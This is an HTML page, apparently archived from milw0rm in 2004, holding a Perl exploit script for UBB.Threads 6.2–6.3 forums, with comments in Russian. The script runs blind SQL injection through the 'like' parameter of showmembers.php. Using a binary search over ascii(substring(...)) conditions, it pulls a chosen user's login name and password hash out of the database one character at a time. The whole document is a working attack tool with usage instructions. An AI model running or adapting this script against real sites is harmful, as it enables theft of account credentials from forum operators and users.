<html><head><title>UBB.threads 6.2.*-6.3.* one char bruteforce exploit</title></head><pre>#!/usr/bin/perl

use LWP::UserAgent;

# UBB.Threads 6.2.* - 6.3.* exploit
# with one char brute technique
# by 1dt.w0lf // r57

$path     = $ARGV[0];
$username = $ARGV[1];

$s_num = 1;
$n=0;
$|++;

if (@ARGV &lt; 2) { &amp;usage; }

print &quot;Please wait...\r\n&quot;;
print &quot;[&quot;;

while(1)
{
# &amp;#1085;&amp;#1072;&amp;#1095;&amp;#1080;&amp;#1085;&amp;#1072;&amp;#1077;&amp;#1084; &amp;#1087;&amp;#1077;&amp;#1088;&amp;#1077;&amp;#1073;&amp;#1086;&amp;#1088; &amp;#1089; &amp;#1087;&amp;#1086;&amp;#1083;&amp;#1085;&amp;#1086;&amp;#1075;&amp;#1086; &amp;#1076;&amp;#1080;&amp;#1072;&amp;#1087;&amp;#1072;&amp;#1079;&amp;#1086;&amp;#1085;&amp;#1072;
&amp;found(0,122);   
# &amp;#1077;&amp;#1089;&amp;#1083;&amp;#1080; &amp;#1074;&amp;#1086;&amp;#1079;&amp;#1074;&amp;#1088;&amp;#1072;&amp;#1097;&amp;#1077;&amp;#1085;&amp;#1085;&amp;#1099;&amp;#1081; &amp;#1082;&amp;#1086;&amp;#1076; 0 &amp;#1079;&amp;#1085;&amp;#1072;&amp;#1095;&amp;#1080;&amp;#1090; &amp;#1076;&amp;#1086;&amp;#1096;&amp;#1083;&amp;#1080; &amp;#1076;&amp;#1086; &amp;#1082;&amp;#1086;&amp;#1085;&amp;#1094;&amp;#1072; &amp;#1089;&amp;#1090;&amp;#1088;&amp;#1086;&amp;#1082;&amp;#1080; &amp;#1080; &amp;#1074;&amp;#1099;&amp;#1074;&amp;#1086;&amp;#1076;&amp;#1080;&amp;#1084; &amp;#1087;&amp;#1086;&amp;#1083;&amp;#1091;&amp;#1095;&amp;#1077;&amp;#1085;&amp;#1085;&amp;#1099;&amp;#1081; &amp;#1088;&amp;#1077;&amp;#1079;&amp;#1091;&amp;#1083;&amp;#1100;&amp;#1090;&amp;#1072;&amp;#1090;
if ($char==&quot;0&quot;)  
 { 
 print &quot;]\r\n\r\n&quot;; 
 # &amp;#1088;&amp;#1072;&amp;#1079;&amp;#1076;&amp;#1077;&amp;#1083;&amp;#1103;&amp;#1077;&amp;#1084; &amp;#1087;&amp;#1086;&amp;#1083;&amp;#1091;&amp;#1095;&amp;#1077;&amp;#1085;&amp;#1085;&amp;#1091;&amp;#1102; &amp;#1089;&amp;#1090;&amp;#1088;&amp;#1086;&amp;#1082;&amp;#1091; &amp;#1085;&amp;#1072; &amp;#1083;&amp;#1086;&amp;#1075;&amp;#1080;&amp;#1085; &amp;#1080; &amp;#1087;&amp;#1072;&amp;#1088;&amp;#1086;&amp;#1083;&amp;#1100;
 ($res1,$res2)=split(&quot;:&quot;,$allchar);  # 
 print &quot;------------------x REPORT x-------------------\r\n&quot;;
 print &quot;      Username: $username\r\n&quot;;
 print &quot;    Login Name: $res1\r\n&quot;;
 print &quot; Password Hash: $res2\r\n&quot;; 
 print &quot;------------------x REPORT x-------------------\r\n&quot;;
 print &quot;total requests: $n\r\n&quot;;
 exit(); 
 }
else 
 { 
 # &amp;#1087;&amp;#1088;&amp;#1077;&amp;#1086;&amp;#1073;&amp;#1088;&amp;#1072;&amp;#1079;&amp;#1091;&amp;#1077;&amp;#1084; &amp;#1087;&amp;#1086;&amp;#1083;&amp;#1091;&amp;#1095;&amp;#1077;&amp;#1085;&amp;#1085;&amp;#1099;&amp;#1081; &amp;#1082;&amp;#1086;&amp;#1076; &amp;#1074; &amp;#1089;&amp;#1080;&amp;#1084;&amp;#1074;&amp;#1086;&amp;#1083; &amp;#1080; &amp;#1076;&amp;#1086;&amp;#1073;&amp;#1072;&amp;#1074;&amp;#1083;&amp;#1103;&amp;#1077;&amp;#1084; &amp;#1077;&amp;#1075;&amp;#1086; &amp;#1082; &amp;#1089;&amp;#1090;&amp;#1088;&amp;#1086;&amp;#1082;&amp;#1077; &amp;#1088;&amp;#1077;&amp;#1079;&amp;#1091;&amp;#1083;&amp;#1100;&amp;#1090;&amp;#1072;&amp;#1090;&amp;#1072;
 print &quot;|&quot;; 
 $allchar .= chr($char); 
 }
# &amp;#1091;&amp;#1074;&amp;#1077;&amp;#1083;&amp;#1080;&amp;#1095;&amp;#1080;&amp;#1074;&amp;#1072;&amp;#1077;&amp;#1084; &amp;#1087;&amp;#1086;&amp;#1079;&amp;#1080;&amp;#1094;&amp;#1080;&amp;#1102; &amp;#1089;&amp;#1080;&amp;#1084;&amp;#1074;&amp;#1086;&amp;#1083;&amp;#1072; &amp;#1085;&amp;#1072; &amp;#1077;&amp;#1076;&amp;#1080;&amp;#1085;&amp;#1080;&amp;#1094;&amp;#1091; &amp;#1080; &amp;#1087;&amp;#1088;&amp;#1086;&amp;#1076;&amp;#1086;&amp;#1083;&amp;#1078;&amp;#1072;&amp;#1077;&amp;#1084; &amp;#1087;&amp;#1077;&amp;#1088;&amp;#1077;&amp;#1073;&amp;#1086;&amp;#1088;
$s_num++;
}



sub found($$)
 {
 # &amp;#1086;&amp;#1087;&amp;#1088;&amp;#1077;&amp;#1076;&amp;#1077;&amp;#1083;&amp;#1103;&amp;#1077;&amp;#1084; &amp;#1087;&amp;#1077;&amp;#1088;&amp;#1077;&amp;#1076;&amp;#1072;&amp;#1085;&amp;#1085;&amp;#1099;&amp;#1081; &amp;#1076;&amp;#1080;&amp;#1072;&amp;#1087;&amp;#1072;&amp;#1079;&amp;#1086;&amp;#1085;
 my $fmin = $_[0];
 my $fmax = $_[1];
 # &amp;#1077;&amp;#1089;&amp;#1083;&amp;#1080; &amp;#1076;&amp;#1080;&amp;#1072;&amp;#1087;&amp;#1072;&amp;#1079;&amp;#1086;&amp;#1085; &amp;#1084;&amp;#1077;&amp;#1085;&amp;#1077;&amp;#1077; 5 &amp;#1090;&amp;#1086; &amp;#1087;&amp;#1077;&amp;#1088;&amp;#1077;&amp;#1093;&amp;#1086;&amp;#1076;&amp;#1080;&amp;#1084; &amp;#1082; &amp;#1087;&amp;#1077;&amp;#1088;&amp;#1077;&amp;#1073;&amp;#1086;&amp;#1088;&amp;#1091;
 if (($fmax-$fmin)&lt;5) { $char=&amp;crack($fmin,$fmax); return $char; }
 # &amp;#1086;&amp;#1087;&amp;#1088;&amp;#1077;&amp;#1076;&amp;#1077;&amp;#1083;&amp;#1103;&amp;#1077;&amp;#1084; &amp;#1094;&amp;#1077;&amp;#1085;&amp;#1090;&amp;#1088; &amp;#1076;&amp;#1080;&amp;#1072;&amp;#1087;&amp;#1072;&amp;#1079;&amp;#1086;&amp;#1085;&amp;#1072;
 $r = int($fmax - ($fmax-$fmin)/2);
 # &amp;#1076;&amp;#1077;&amp;#1083;&amp;#1072;&amp;#1077;&amp;#1084; &amp;#1091;&amp;#1089;&amp;#1083;&amp;#1086;&amp;#1074;&amp;#1080;&amp;#1077;
 $check = &quot;&gt;$r&quot;;
 # &amp;#1080; &amp;#1087;&amp;#1088;&amp;#1086;&amp;#1074;&amp;#1077;&amp;#1088;&amp;#1103;&amp;#1077;&amp;#1084; &amp;#1091;&amp;#1089;&amp;#1083;&amp;#1086;&amp;#1074;&amp;#1080;&amp;#1077;, &amp;#1074; &amp;#1079;&amp;#1072;&amp;#1074;&amp;#1080;&amp;#1089;&amp;#1080;&amp;#1084;&amp;#1086;&amp;#1089;&amp;#1090;&amp;#1080; &amp;#1086;&amp;#1090; &amp;#1088;&amp;#1077;&amp;#1079;&amp;#1091;&amp;#1083;&amp;#1100;&amp;#1090;&amp;#1072;&amp;#1090;&amp;#1072; &amp;#1088;&amp;#1077;&amp;#1082;&amp;#1091;&amp;#1088;&amp;#1089;&amp;#1080;&amp;#1074;&amp;#1085;&amp;#1086; &amp;#1074;&amp;#1099;&amp;#1079;&amp;#1099;&amp;#1074;&amp;#1072;&amp;#1077;&amp;#1084; &amp;#1092;&amp;#1091;&amp;#1085;&amp;#1082;&amp;#1094;&amp;#1080;&amp;#1102; &amp;#1089; &amp;#1085;&amp;#1086;&amp;#1074;&amp;#1099;&amp;#1084; &amp;#1076;&amp;#1080;&amp;#1072;&amp;#1087;&amp;#1072;&amp;#1079;&amp;#1086;&amp;#1085;&amp;#1086;&amp;#1084;
 if ( &amp;check($check) ) { &amp;found($r,$fmax); }
 else { &amp;found($fmin,$r+1); }
 }
 
sub crack($$)
 {
 # &amp;#1086;&amp;#1087;&amp;#1088;&amp;#1077;&amp;#1076;&amp;#1077;&amp;#1083;&amp;#1103;&amp;#1077;&amp;#1084; &amp;#1087;&amp;#1077;&amp;#1088;&amp;#1077;&amp;#1076;&amp;#1072;&amp;#1085;&amp;#1085;&amp;#1099;&amp;#1081; &amp;#1076;&amp;#1080;&amp;#1072;&amp;#1087;&amp;#1072;&amp;#1079;&amp;#1086;&amp;#1085;
 my $cmin = $_[0];
 my $cmax = $_[1];
 $i = $cmin;
 # &amp;#1080; &amp;#1087;&amp;#1088;&amp;#1086;&amp;#1093;&amp;#1086;&amp;#1076;&amp;#1080;&amp;#1084; &amp;#1087;&amp;#1086; &amp;#1082;&amp;#1072;&amp;#1078;&amp;#1076;&amp;#1086;&amp;#1084;&amp;#1091; &amp;#1079;&amp;#1085;&amp;#1072;&amp;#1095;&amp;#1077;&amp;#1085;&amp;#1080;&amp;#1102; &amp;#1080;&amp;#1079; &amp;#1076;&amp;#1080;&amp;#1072;&amp;#1087;&amp;#1072;&amp;#1079;&amp;#1086;&amp;#1085;&amp;#1072;
 while ($i&lt;$cmax)
  {
  # &amp;#1076;&amp;#1077;&amp;#1083;&amp;#1072;&amp;#1077;&amp;#1084; &amp;#1091;&amp;#1089;&amp;#1083;&amp;#1086;&amp;#1074;&amp;#1080;&amp;#1077;
  $crcheck = &quot;=$i&quot;;
  # &amp;#1087;&amp;#1088;&amp;#1086;&amp;#1074;&amp;#1077;&amp;#1088;&amp;#1103;&amp;#1077;&amp;#1084; &amp;#1077;&amp;#1075;&amp;#1086;
  if ( &amp;check($crcheck) ) { return $i; }
  $i++;
  }
 return;
 }
 
sub check($)
 {
 # &amp;#1091;&amp;#1074;&amp;#1077;&amp;#1083;&amp;#1080;&amp;#1095;&amp;#1080;&amp;#1074;&amp;#1072;&amp;#1077;&amp;#1084; &amp;#1082;&amp;#1086;&amp;#1083;&amp;#1080;&amp;#1095;&amp;#1077;&amp;#1089;&amp;#1090;&amp;#1074;&amp;#1086; &amp;#1079;&amp;#1072;&amp;#1087;&amp;#1088;&amp;#1086;&amp;#1089;&amp;#1086;&amp;#1074;
 $n++;
 # &amp;#1086;&amp;#1087;&amp;#1088;&amp;#1077;&amp;#1076;&amp;#1077;&amp;#1083;&amp;#1103;&amp;#1077;&amp;#1084; &amp;#1091;&amp;#1089;&amp;#1083;&amp;#1086;&amp;#1074;&amp;#1080;&amp;#1077; 
 $ccheck = $_[0];
 # &amp;#1089;&amp;#1086;&amp;#1079;&amp;#1076;&amp;#1072;&amp;#1077;&amp;#1084; http &amp;#1079;&amp;#1072;&amp;#1087;&amp;#1088;&amp;#1086;&amp;#1089; &amp;#1082; &amp;#1089;&amp;#1077;&amp;#1088;&amp;#1074;&amp;#1077;&amp;#1088;&amp;#1091; 
 $http_query = $path.&quot;?Cat=&amp;page=1&amp;like=&quot;.$username.&quot;' AND ascii(substring(CONCAT(U_LoginName,CHAR(58),U_Password),&quot;.$s_num.&quot;,1))&quot;.$ccheck.&quot; /*&quot;;
 
 # &amp;#1045;&amp;#1089;&amp;#1083;&amp;#1080; &amp;#1074;&amp;#1099; &amp;#1093;&amp;#1086;&amp;#1090;&amp;#1080;&amp;#1090;&amp;#1077; &amp;#1074;&amp;#1080;&amp;#1076;&amp;#1077;&amp;#1090;&amp;#1100; &amp;#1074;&amp;#1089;&amp;#1077; &amp;#1079;&amp;#1072;&amp;#1087;&amp;#1088;&amp;#1086;&amp;#1089;&amp;#1099; &amp;#1086;&amp;#1090;&amp;#1087;&amp;#1088;&amp;#1072;&amp;#1074;&amp;#1083;&amp;#1103;&amp;#1077;&amp;#1084;&amp;#1099;&amp;#1077; &amp;#1082; &amp;#1089;&amp;#1082;&amp;#1088;&amp;#1080;&amp;#1087;&amp;#1090;&amp;#1091;
 # &amp;#1090;&amp;#1086; &amp;#1088;&amp;#1072;&amp;#1089;&amp;#1089;&amp;#1082;&amp;#1086;&amp;#1084;&amp;#1077;&amp;#1085;&amp;#1090;&amp;#1080;&amp;#1088;&amp;#1091;&amp;#1081;&amp;#1090;&amp;#1077; &amp;#1089;&amp;#1083;&amp;#1077;&amp;#1076;&amp;#1091;&amp;#1102;&amp;#1097;&amp;#1091;&amp;#1102; &amp;#1089;&amp;#1090;&amp;#1088;&amp;#1086;&amp;#1082;&amp;#1091;
 # print &quot;\r\n $http_query \r\n&quot;;
 
 $mcb_reguest = LWP::UserAgent-&gt;new() or die;
 # &amp;#1087;&amp;#1086;&amp;#1083;&amp;#1091;&amp;#1095;&amp;#1072;&amp;#1077;&amp;#1084; &amp;#1086;&amp;#1090;&amp;#1074;&amp;#1077;&amp;#1090; &amp;#1089;&amp;#1077;&amp;#1088;&amp;#1074;&amp;#1077;&amp;#1088;&amp;#1072;
 $res = $mcb_reguest-&gt;post($http_query); 
 @results = $res-&gt;content; 
 # &amp;#1087;&amp;#1088;&amp;#1086;&amp;#1074;&amp;#1077;&amp;#1088;&amp;#1103;&amp;#1077;&amp;#1084; &amp;#1086;&amp;#1090;&amp;#1074;&amp;#1077;&amp;#1090; &amp;#1089;&amp;#1077;&amp;#1088;&amp;#1074;&amp;#1077;&amp;#1088;&amp;#1072; &amp;#1085;&amp;#1072; &amp;#1085;&amp;#1072;&amp;#1083;&amp;#1080;&amp;#1095;&amp;#1080;&amp;#1077; &amp;#1089;&amp;#1090;&amp;#1088;&amp;#1086;&amp;#1082;&amp;#1080;
 foreach $result(@results)
  {
  if ($result =~ /&lt;td class=\&quot;lighttable\&quot;&gt;/) { return 1; }
  }
 return 0;
 }
 
sub usage
 {
 print &quot;=========================================================\r\n&quot;;
 print &quot; UBB.Threads 6.2.*-6.3.* one char bruteforce exploit\r\n&quot;;
 print &quot; For all MySQL versions! Don't need UNION support!\r\n&quot;;
 print &quot;=========================================================\r\n&quot;;
 print &quot; Usage: $0 [path/to/showmembers.php] [username]\r\n&quot;;
 print &quot; e.g. : $0 http://127.0.0.1/showmembers.php admin\r\n&quot;;
 print &quot;=========================================================\r\n&quot;;
 exit(); 
 }

# milw0rm.com [2004-11-15]</pre></html>